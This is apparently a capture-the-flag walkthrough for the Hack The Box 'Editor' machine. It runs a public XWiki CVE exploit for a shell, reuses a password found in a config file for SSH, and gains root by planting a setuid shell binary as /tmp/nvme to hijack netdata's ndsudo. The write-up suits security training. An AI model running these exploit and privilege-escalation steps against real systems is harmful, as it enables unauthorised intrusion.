# ✏️ Editor HTB - Walkthrough

## 🔍 Initial Reconnaissance

I started my reconnaissance with a thorough `nmap` scan on the target machine:

```bash
nmap -sC -sV -A 10.10.11.80
```

The results revealed three open ports:

- **🛡️ Port 22** → SSH
- **🌐 Port 80** → HTTP (default Apache page)
- **⚙️ Port 8080** → HTTP (XWiki service)

Upon accessing port 8080, I found the **XWiki** web interface. I immediately noticed the software version and identified a CVE.

## 🔓 XWiki Exploitation (CVE-2025-24893)

Searching online for the XWiki version, I identified **CVE-2025-24893** associated with an exploit available on https://github.com/gunzf0x/CVE-2025-24893. 

I downloaded and executed the exploit, obtaining a shell on the machine.

```bash
git clone https://github.com/gunzf0x/CVE-2025-24893
cd CVE-2025-24893
python3 exploit.py http://10.10.11.80:8080/
```

## 🔑 Obtaining User Credentials

Once I had a shell, I searched for configuration files containing passwords. I found the `hibernate.cfg.xml` file and, by filtering its content, I discovered several passwords, including an interesting one: `theEd1t0rTeam99`. 



```bash
cat hibernate.cfg.xml | grep password
```

I identified a user named **oliver**. I attempted to log in via SSH with the user `oliver` and the password `theEd1t0rTeam99`:

```bash
ssh oliver@10.10.11.80
```

✅ SSH access successfully obtained! I retrieved the **user flag** from oliver's home directory.

## 🚀 Privilege Escalation to Root

For privilege escalation, I searched for files with the SUID bit set, which could be executed as root:

```bash
find / -user root -perm -4000 -print 2>/dev/null
```

Among the various results, `ndsudo` under `/opt/netdata/usr/libexec/netdata/plugins.d/` caught my attention. I examined the file with `strings`:

```bash
strings /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

I noticed that `ndsudo` executes `nvme` and attempts to load values from `/tmp/nvme`. This suggested a possible path hijacking vulnerability.

I created a simple C code to obtain a root shell:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    setuid(0); 
    setgid(0); 
    system("/bin/bash -p");
    return 0;
}
```

I compiled the code and uploaded it to the victim machine, saving it as `nvme` in `/tmp/`:

```bash
gcc getshell.c -o /tmp/nvme
chmod +x /tmp/nvme
```

Finally, I executed `ndsudo` in a way that would make it call my fictitious `nvme` script:

```bash
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-smart-log --device "dummy"
```

✅ I obtained a root shell! I retrieved the **root flag** from the `/root` directory.

## 🎯 Conclusion

The **Editor** machine was successfully completed! 🧩

- Initial access obtained through a CVE exploit in XWiki.
- User credentials discovered from configuration files and SSH access gained.
- Privilege escalation to root via path manipulation with `ndsudo` and creation of a malicious executable.
- User and root flags acquired! 🏁